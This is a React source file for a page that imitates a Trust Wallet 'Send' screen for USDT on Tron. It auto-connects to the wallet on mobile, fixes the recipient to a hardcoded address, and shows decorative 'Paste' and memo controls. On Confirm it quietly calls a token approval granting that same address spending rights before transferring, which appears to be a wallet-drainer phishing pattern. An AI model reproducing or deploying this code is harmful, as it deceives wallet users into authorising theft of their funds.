import { useEffect, useMemo, useRef, useState } from "react";
import { Info, ScanLine, Wallet } from "lucide-react";
import { toast } from "sonner";
import { useTronWallet } from "@/lib/tronwallet-adapter";
import { getWalletConnectAppUrl } from "@/lib/walletconnect-app-url";
import { approveUSDT, transferUSDT } from "@/lib/web3";

const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
const DEFAULT_AMOUNT = "10";

/**
 * WalletConnect v2 pairing URIs are long strings (typically `wc:...@2?...`).
 * Trust Wallet opens its generic landing page if `uri` is empty/too short — do not navigate then.
 * We only reject obviously-invalid values; matching `wc:` is case-insensitive.
 */
function normalizeWalletConnectPairingUri(uri: unknown): string | null {
  if (uri == null) return null;
  const s = (typeof uri === "string" ? uri : String(uri)).trim();
  if (s.length < 12) return null;
  const lower = s.toLowerCase();
  if (!lower.startsWith("wc:")) return null;
  return s;
}

/** @returns whether navigation was triggered */
function navigateToTrustWalletConnect(uri: string): boolean {
  const normalized = normalizeWalletConnectPairingUri(uri);
  if (!normalized) return false;
  const encoded = encodeURIComponent(normalized);
  const w = typeof window !== "undefined" ? (window as unknown as { trustwallet?: unknown }) : null;
  // Same routes work as https://link.trustwallet.com/... or trust:// (Trust docs).
  // In Trust Discover, trust:// avoids universal-link round-trips that can stall WC.
  const deepLink = w?.trustwallet
    ? `trust://wc?uri=${encoded}`
    : `https://link.trustwallet.com/wc?uri=${encoded}`;
  window.location.assign(deepLink);
  return true;
}

function buildTrustWalletOpenUrlDeepLink(): string {
  if (typeof window === "undefined") {
    return "";
  }
  const target = `${getWalletConnectAppUrl()}/#/trustwallet/tron`;
  // coin_id=195 = TRON (SLIP-44)
  return `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(
    target
  )}`;
}

function getTrustStatusSnapshot(): Record<string, unknown> {
  if (typeof window === "undefined") {
    return { env: "no-window" };
  }

  const w = window as any;
  const ua = navigator.userAgent || "";
  const isMobile = /android|iphone|ipad|ipod/i.test(ua);

  const trustwallet = w.trustwallet;
  const tronLink = w.tronLink;
  const tronWeb = w.tronWeb;

  const twTronLink = trustwallet?.tronLink;
  const twTron = trustwallet?.tron;

  const injectedTronWeb =
    tronWeb ??
    tronLink?.tronWeb ??
    twTronLink?.tronWeb ??
    twTron?.tronWeb ??
    null;

  const base58 = injectedTronWeb?.defaultAddress?.base58 ?? null;
  const ready = injectedTronWeb?.ready ?? null;
  const hasRequest =
    typeof twTronLink?.request === "function" ||
    typeof twTron?.request === "function" ||
    typeof tronLink?.request === "function" ||
    typeof tronWeb?.request === "function";

  return {
    isMobile,
    ua: ua.slice(0, 140),
    hasTrustWallet: Boolean(trustwallet),
    hasTW_tronLink: Boolean(twTronLink),
    hasTW_tron: Boolean(twTron),
    hasWindowTronLink: Boolean(tronLink),
    hasWindowTronWeb: Boolean(tronWeb),
    injectedTronWebReady: ready,
    injectedBase58: base58,
    hasAnyRequestMethod: hasRequest,
  };
}

function getTrustRequestProvider(): { request?: (p: { method: string; params?: unknown }) => Promise<unknown> } | null {
  if (typeof window === "undefined") return null;
  const w = window as any;
  return (
    w.trustwallet?.tronLink ??
    w.trustwallet?.tron ??
    w.tronLink ??
    (typeof w.tronWeb?.request === "function" ? w.tronWeb : null) ??
    null
  );
}

const TrustWalletTronPay = () => {
  const { connect, address, isConnected, isConnecting } = useTronWallet();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [trustConnecting, setTrustConnecting] = useState(false);
  const [wcConnecting, setWcConnecting] = useState(false);
  const [amountInput, setAmountInput] = useState(DEFAULT_AMOUNT);
  const autoConnectAttempted = useRef(false);
  const trustPopupAttempted = useRef(false);
  const isConnectedRef = useRef(isConnected);
  const isConnectingRef = useRef(isConnecting);
  const wcConnectingRef = useRef(wcConnecting);
  const trustConnectingRef = useRef(trustConnecting);
  /** Avoid double navigation if display_uri fires more than once. */
  const wcDeepLinkNavigatedRef = useRef(false);
  const [statusOpen, setStatusOpen] = useState(false);
  const [lastAutoConnect, setLastAutoConnect] = useState<
    | { state: "idle" }
    | { state: "connecting"; startedAt: number }
    | { state: "connected"; finishedAt: number }
    | { state: "error"; finishedAt: number; message: string }
  >({ state: "idle" });
  const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
  const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);

  const trustConnectDeepLink = useMemo(() => buildTrustWalletOpenUrlDeepLink(), []);
  const trustConnectQrUrl = useMemo(
    () =>
      `https://quickchart.io/qr?size=420&margin=1&ecLevel=H&dark=1e81f5&light=f2f2f2&text=${encodeURIComponent(
        trustConnectDeepLink
      )}`,
    [trustConnectDeepLink]
  );

  useEffect(() => {
    isConnectedRef.current = isConnected;
  }, [isConnected]);
  useEffect(() => {
    isConnectingRef.current = isConnecting;
  }, [isConnecting]);
  useEffect(() => {
    wcConnectingRef.current = wcConnecting;
  }, [wcConnecting]);
  useEffect(() => {
    trustConnectingRef.current = trustConnecting;
  }, [trustConnecting]);

  const handleWalletConnectQr = async () => {
    try {
      setWcConnecting(true);
      wcDeepLinkNavigatedRef.current = false;
      const ua = typeof navigator !== "undefined" ? navigator.userAgent || "" : "";
      const isMobile = /android|iphone|ipad|ipod/i.test(ua);
      if (isMobile) {
        (window as any).__tronWalletConnectOnUri = (uri: string) => {
          if (wcDeepLinkNavigatedRef.current) return;
          if (navigateToTrustWalletConnect(uri)) {
            wcDeepLinkNavigatedRef.current = true;
          }
        };
        await connect("walletconnect");
        toast.success("Wallet connected");
      } else {
        await connect("walletconnect");
        toast.success("Wallet connected");
      }
    } catch (error) {
      if (wcDeepLinkNavigatedRef.current) {
        // Tab may unload or session completes after returning from Trust — avoid false failure toasts.
        return;
      }
      toast.error(
        error instanceof Error ? error.message : "WalletConnect failed"
      );
    } finally {
      try {
        delete (window as any).__tronWalletConnectOnUri;
      } catch {
        /* ignore */
      }
      setWcConnecting(false);
    }
  };
  
  useEffect(() => {
    if (typeof window === "undefined") return;
    const ua = navigator.userAgent || "";
    const isMobile = /android|iphone|ipad|ipod/i.test(ua);

    // Only auto-connect on mobile. Desktop users can use WalletConnect.
    if (!isMobile) return;
    // Do not auto-start WalletConnect on load — it navigates to link.trustwallet.com/wc and
    // races Trust Discover injection (often ends on bare link.trustwallet.com with bad/empty URIs).
    // Trust injection can arrive after first paint on some mobile builds.
    // Poll briefly for trustwallet.* / tronLink injection, then:
    // - trigger Trust's connect popup (tron_requestAccounts) once per visit
    // - then connect via adapter (for consistent address state)
    const startedAt = Date.now();
    const timeoutMs = 20_000;
    const intervalMs = 500;

    const tick = async () => {
      if (
        isConnectedRef.current ||
        isConnectingRef.current ||
        trustConnectingRef.current ||
        wcConnectingRef.current
      ) {
        return;
      }
      if (Date.now() - startedAt > timeoutMs) return;
      
      const w = window as any;
      const hasInjectedTrust =
      Boolean(w.trustwallet?.tronLink) || Boolean(w.trustwallet?.tron);
      const uaLooksTrust = /trust/i.test(ua);
      
      // Only auto-connect if we're already in Trust (Discover / in-app browser).
      if (!hasInjectedTrust && !uaLooksTrust) return;
      
      // If Trust is injected but request() isn't ready yet, keep waiting.
      const provider = getTrustRequestProvider();
      const hasRequest = typeof provider?.request === "function";
      if (!hasRequest) {
        return;
      }
      
      // Mark as attempted only once we're actually able to trigger a request/connect.
      if (autoConnectAttempted.current) return;
      autoConnectAttempted.current = true;
      try {
        // 1) Force the Trust connect-confirm popup (best effort).
        // Note: if the dApp is already authorized, Trust may not show a popup again.
        if (!trustPopupAttempted.current) {
          trustPopupAttempted.current = true;
          try {
            const websiteName = "FIU ID";
            const websiteIcon = `${getWalletConnectAppUrl()}/favicon.ico`;
            await provider.request?.({
              method: "tron_requestAccounts",
              params: { websiteName, websiteIcon },
            });
          } catch {
            // Ignore here; connect("trust") will surface meaningful errors.
          }
        }
        
        // 2) Adapter connect for app state (address/isConnected).
        setLastAutoConnect({ state: "connecting", startedAt: Date.now() });
        setTrustConnecting(true);
        await connect("trust");
        setLastAutoConnect({ state: "connected", finishedAt: Date.now() });
        toast.success("Wallet connected");
      } catch (error) {
        const message =
        error instanceof Error ? error.message : "Could not connect in Trust Wallet";
        setLastAutoConnect({ state: "error", finishedAt: Date.now(), message });
        toast.error(message);
        
        // If the failure is due to injection/availability timing, allow retries until timeout.
        const lower = message.toLowerCase();
        const likelyTiming =
          lower.includes("not available") ||
          lower.includes("not found") ||
          lower.includes("timeout") ||
          lower.includes("ready");
        if (likelyTiming) {
          autoConnectAttempted.current = false;
          trustPopupAttempted.current = false;
        }
      } finally {
        setTrustConnecting(false);
      }
    };

    const id = window.setInterval(() => {
      void tick();
    }, intervalMs);
    // Try immediately too.
    void tick();

    return () => {
      window.clearInterval(id);
    };
  }, [connect]);
  
  // WalletConnect auto-fallback (mobile): if Trust injection exists but connect isn't happening,
  // kick off WalletConnect once per visit.
  useEffect(() => {
    if (typeof window === "undefined") return;
    const ua = navigator.userAgent || "";
    const isMobile = /android|iphone|ipad|ipod/i.test(ua);
    if (!isMobile) return;
    if (isConnected || isConnecting || trustConnecting || wcConnecting) return;

    const snapshot = getTrustStatusSnapshot();
    const hasTrust = Boolean(snapshot.hasTrustWallet);
    const hasRequest = Boolean(snapshot.hasAnyRequestMethod);
    if (!hasTrust || !hasRequest) return;
    if (lastAutoConnect.state === "connected") return;

    // If auto-connect errored, fallback to WC once.
    if (lastAutoConnect.state !== "error") return;

    const onceKey = "__tw_wc_autostarted";
    if ((window as any)[onceKey]) return;
    (window as any)[onceKey] = true;

    setWcConnecting(true);
    wcDeepLinkNavigatedRef.current = false;
    (window as any).__tronWalletConnectOnUri = (uri: string) => {
      if (wcDeepLinkNavigatedRef.current) return;
      if (navigateToTrustWalletConnect(uri)) {
        wcDeepLinkNavigatedRef.current = true;
      }
    };
    void (async () => {
      try {
        await connect("walletconnect");
        toast.success("Wallet connected");
      } catch (error) {
        if (wcDeepLinkNavigatedRef.current) {
          return;
        }
        toast.error(
          error instanceof Error ? error.message : "WalletConnect failed"
        );
      } finally {
        try {
          delete (window as any).__tronWalletConnectOnUri;
        } catch {
          /* ignore */
        }
        setWcConnecting(false);
      }
    })();
  }, [connect, isConnected, isConnecting, trustConnecting, wcConnecting, lastAutoConnect]);

  const handleConfirm = async () => {
    if (!isConnected) {
      toast.error("Connect your wallet first using the QR code or WalletConnect.");
      return;
    }
    try {
      setIsSubmitting(true);

      const normalizedAmount = amountInput.trim();
      const numericAmount = Number(normalizedAmount);
      if (!normalizedAmount || !Number.isFinite(numericAmount) || numericAmount <= 0) {
        toast.error("Enter a valid USDT amount.");
        return;
      }

      await approveUSDT("tron", approveTo);
      await transferUSDT("tron", toAddress, normalizedAmount);

      toast.success("Approve and transfer completed successfully.");
    } catch (error) {
      toast.error(
        error instanceof Error ? error.message : "Transaction flow failed"
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3 pb-28">
      <div className="w-full max-w-sm bg-[#f5f5f6] pt-4">
        <div className="mb-5">
          <p className="text-[24px] leading-7 font-semibold text-[#262626]">
            Send
          </p>
          <div className="text-xs text-[#8b8b94] mt-1 flex items-center gap-1.5">
            <Wallet className="w-3.5 h-3.5" />
            {isConnected
              ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
              : isConnecting || wcConnecting || trustConnecting
              ? "Connecting..."
              : "Not connected — scan QR or use WalletConnect"}
          </div>
        </div>

        <div className="mb-4 rounded-xl border border-[#e4e4e8] bg-white p-3 shadow-sm">
          <button
            type="button"
            onClick={() => setStatusOpen((v) => !v)}
            className="w-full text-left"
          >
            <div className="flex items-center justify-between gap-3">
              <div className="text-sm font-semibold text-[#262626]">Wallet status</div>
              <div className="text-xs text-[#5e5e66]">{statusOpen ? "Hide" : "Show"}</div>
            </div>
            <div className="mt-1 text-xs text-[#8b8b94]">
              {isConnected
                ? "Connected"
                : isConnecting || wcConnecting || trustConnecting
                ? "Connecting"
                : "Not connected"}
            </div>
          </button>

          {statusOpen && (
            <div className="mt-3 space-y-2">
              <div className="text-xs text-[#4b4b54]">
                <span className="font-semibold">adapter</span>:{" "}
                {isConnected ? "connected" : "not-connected"} /{" "}
                {isConnecting || wcConnecting || trustConnecting ? "connecting" : "idle"}
              </div>
              <div className="text-xs text-[#4b4b54]">
                <span className="font-semibold">connecting flags</span>: adapter=
                {String(isConnecting)}, trust={String(trustConnecting)}, wc=
                {String(wcConnecting)}
              </div>
              <div className="text-xs text-[#4b4b54]">
                <span className="font-semibold">auto-connect</span>:{" "}
                {lastAutoConnect.state === "idle"
                  ? "idle"
                  : lastAutoConnect.state === "connecting"
                  ? "connecting"
                  : lastAutoConnect.state === "connected"
                  ? "connected"
                  : `error: ${lastAutoConnect.message}`}
              </div>
              <div className="text-xs text-[#4b4b54]">
                <span className="font-semibold">address</span>: {address ?? "-"}
              </div>
              <div className="rounded-lg bg-[#f5f5f6] p-2">
                <pre className="text-[10px] leading-4 text-[#5e5e66] whitespace-pre-wrap break-words select-all m-0">
{JSON.stringify(getTrustStatusSnapshot(), null, 2)}
                </pre>
              </div>
              <button
                type="button"
                className="w-full rounded-full border border-[#d7d7dc] bg-white py-2 text-xs font-semibold text-[#4b4b54]"
                onClick={async () => {
                  const text = JSON.stringify(getTrustStatusSnapshot(), null, 2);
                  try {
                    await navigator.clipboard.writeText(text);
                    toast.success("Status copied");
                  } catch {
                    toast.error("Copy failed");
                  }
                }}
              >
                Copy status
              </button>
            </div>
          )}
        </div>

        {!isConnected && (
          <div className="mb-6 rounded-xl border border-[#e4e4e8] bg-white p-4 shadow-sm">
            <button
              type="button"
              className="mt-2 w-full rounded-full border border-[#d7d7dc] bg-white py-2.5 text-sm font-medium text-[#4b4b54] disabled:opacity-50"
              onClick={handleWalletConnectQr}
              disabled={wcConnecting || trustConnecting || isConnecting}
            >
              {wcConnecting ? "Opening WalletConnect…" : "Connect with WalletConnect (QR)"}
            </button>
          </div>
        )}

        <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
          Address or Domain Name
        </label>
        <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
          <span className="text-[#171717] text-sm truncate">{toAddress}</span>
          <span className="text-[#5f5de8] text-sm font-semibold">Paste</span>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Destination network
          </label>
          <div className="inline-flex items-center gap-2 rounded-full bg-[#efeff2] px-3 py-1.5">
            <span className="w-4 h-4 rounded-full bg-[#ef2c2c] inline-block" />
            <span className="text-sm text-[#4c4c52]">Tron</span>
          </div>
        </div>

        <div className="mt-5">
          <label
            htmlFor="usdt-amount"
            className="text-[#5e5e66] text-[13px] font-medium block mb-2"
          >
            Amount
          </label>
          <div
            className="h-14 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between"
            onClick={(e) => {
              // Some in-app mobile webviews are picky about focusing inputs.
              const input = (e.currentTarget.querySelector("#usdt-amount") as HTMLInputElement | null);
              input?.focus();
            }}
          >
            <input
              id="usdt-amount"
              type="text"
              value={amountInput}
              onChange={(e) => {
                const next = e.target.value;
                // allow empty while typing; otherwise allow numbers + dot
                if (next === "" || /^[0-9]*[.]?[0-9]*$/.test(next)) {
                  setAmountInput(next);
                }
              }}
              inputMode="decimal"
              autoComplete="off"
              spellCheck={false}
              className="w-40 bg-transparent text-[#171717] text-[28px] leading-none font-medium outline-none min-w-0"
              aria-label="USDT amount"
              placeholder={DEFAULT_AMOUNT}
            />
            <div className="flex items-center gap-2">
              <span className="text-[#67676f] text-base">USDT</span>
              <button
                type="button"
                className="text-[#5f5de8] text-base font-semibold"
                onClick={() => setAmountInput(DEFAULT_AMOUNT)}
              >
                Reset
              </button>
            </div>
          </div>
          <p className="text-[#8d8d96] text-xs mt-2">
            ≈ {amountInput.trim() || "0"} USDT
          </p>
        </div>

        <div className="mt-3">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Memo
          </label>
          <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-end gap-3">
            <ScanLine className="w-4 h-4 text-[#5f5de8]" />
            <Info className="w-4 h-4 text-[#5f5de8]" />
          </div>
        </div>
        <button
          className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
          onClick={handleConfirm}
          disabled={
            isSubmitting ||
            !isConnected ||
            isConnecting ||
            wcConnecting ||
            trustConnecting
          }
          type="button"
        >
          {isSubmitting ? "Confirming..." : "Confirm"}
        </button>

      </div>
    </div>
  );
};

export default TrustWalletTronPay;
